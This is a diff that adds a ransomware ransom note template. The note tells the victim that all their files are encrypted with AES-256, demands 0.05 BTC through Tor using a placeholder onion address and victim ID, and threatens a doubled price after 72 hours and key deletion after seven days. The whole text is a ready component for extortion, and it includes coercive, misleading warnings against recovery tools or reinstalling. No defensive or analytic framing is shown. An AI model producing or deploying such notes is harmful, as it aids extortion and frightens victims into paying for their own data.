@@ -1,0 +1,21 @@
+YOUR FILES HAVE BEEN ENCRYPTED
+
+All documents, photos, databases, and personal files on this system
+have been encrypted with AES-256. The encryption key has been uploaded
+to our server and deleted from your machine.
+
+Your unique ID: [generated per victim]
+
+To recover your files:
+1. Install Tor Browser
+2. Visit: [onion address]
+3. Pay 0.05 BTC to the address shown
+4. Receive decryption tool
+
+Do not:
+- Rename encrypted files (.locked extension)
+- Attempt to decrypt with third-party tools (will corrupt files)
+- Reinstall Windows (key will be lost permanently)
+
+Deadline: 72 hours. After that, price doubles.
+After 7 days, key is deleted.
